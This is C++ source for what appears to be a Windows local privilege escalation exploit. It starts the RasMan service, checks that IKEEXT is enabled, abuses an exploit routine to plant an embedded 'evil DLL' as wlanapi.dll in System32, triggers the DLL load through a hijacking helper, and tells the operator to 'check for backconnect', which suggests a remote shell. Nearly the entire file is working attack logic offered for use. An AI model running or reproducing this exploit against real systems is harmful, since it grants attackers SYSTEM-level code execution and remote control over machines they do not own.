// SysTracingExploit.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "Utils.h"
#include "Exploit.h"
#include "resource.h"
#include "NetmanDllHijacking.h"

#include <iostream>
#include <strsafe.h>
#include <filesystem>

int main()
{
	Utils utils;
	DWORD dwRet = 0;
	WCHAR lpTempPathBuffer[MAX_PATH];

	WCHAR lpWorkingDirectory[MAX_PATH];
	WCHAR targetDllPath[MAX_PATH];

	ZeroMemory(lpWorkingDirectory, MAX_PATH);
	ZeroMemory(targetDllPath, MAX_PATH);


	// ========================================================================
	// Check whether RASMAN is running  
	// ========================================================================
	if (utils.IsServiceRunning(L"RasMan"))
	{
		wprintf_s(L"[*] RasMan service is running.\n");
	}
	else
	{
		wprintf_s(L"[!] RasMan service is not running.\n");

		// ========================================================================
		// Start RasMan (this can be done as a low priv user)
		// ========================================================================
		if (utils.StartRasman())
		{
			wprintf_s(L"[*] RasMan has been successfully started.\n");
		}
		else
		{
			std::wcout << L"[-] Exploit failed. RasMan couldn't be started." << std::endl;
			return 1;
		}
	}


	// ========================================================================
	// Check whether IKEEXT is disabled   
	// ========================================================================
	if (utils.IsServiceDisabled(L"IKEEXT"))
	{
		wprintf_s(L"[-] Exploit failed. Ikeext service is disabled.\n");
		return 1;
	}
	else
	{
		wprintf_s(L"[*] Ikeext service is enabled.\n");
	}


	// ========================================================================
	// Run the exploit to move the DLL to C:\Windows\System32\ 
	// ========================================================================
	Exploit exploit;
	const WCHAR* targetDLLName = L"wlanapi.dll";
	if (!exploit.Run(L"C:\\Windows\\System32\\dbghelp.dll", targetDLLName))
	{
		wprintf_s(L"[-] Exploit failed.\n");
		return 1;
	}

	// ========================================================================
	// The evil DLL is embedded as a resource  
	// ========================================================================

	HRSRC rsrc;
	HGLOBAL rsrcData;
	int targetResourceId = 0;
	targetResourceId = IDR_101;

	rsrc = ::FindResource(NULL, MAKEINTRESOURCE(targetResourceId), RT_RCDATA);
	if (rsrc == NULL)
	{
		wprintf_s(L"[-] Exploit failed. Couldn't find resource: '%ls'. Error: %i\n", targetDLLName, GetLastError());
		return 1;
	}
	unsigned int rsrcSize = ::SizeofResource(NULL, rsrc);
	rsrcData = ::LoadResource(NULL, rsrc);
	if (rsrcData == NULL) 
	{
		wprintf_s(L"[-] Exploit failed. Couldn't load resource: '%ls'. Error: %i\n", targetDLLName, GetLastError());
		return 1;
	}
	void* pbinData = ::LockResource(rsrcData);


	// ========================================================================
	// Copy the content of the malicious DLL to the target file  
	// ========================================================================
	HANDLE hFile;
	DWORD dwBytesWritten = 0;
	exploit.GetTargetDllPath(targetDllPath, targetDLLName); // Get the actual path of the target DLL (we'll use sysnative if Wow64 process)
	hFile = CreateFile(targetDllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		wprintf_s(L"[-] Exploit failed. Failed to open target file: '%ls'. Error: %i\n", targetDllPath, GetLastError());
		return 1;
	}
	if (!WriteFile(hFile, (char*)pbinData, rsrcSize, &dwBytesWritten, NULL))
	{
		wprintf_s(L"[-] Exploit failed. Failed write file: '%ls'. Error: %i\n", targetDllPath, GetLastError());
		CloseHandle(hFile);
		return 1;
	}
	CloseHandle(hFile);
	wprintf_s(L"[+] Copied evil DLL to '%ls'.\n", targetDllPath);

	if (triggerDllLoad()) {
		wprintf_s(L"[-] Exploit failed. Could not trigget DLL load.");
		return 1;
	}
	wprintf_s(L"[+] Done. Check for backconnect.");

	return 0;
}

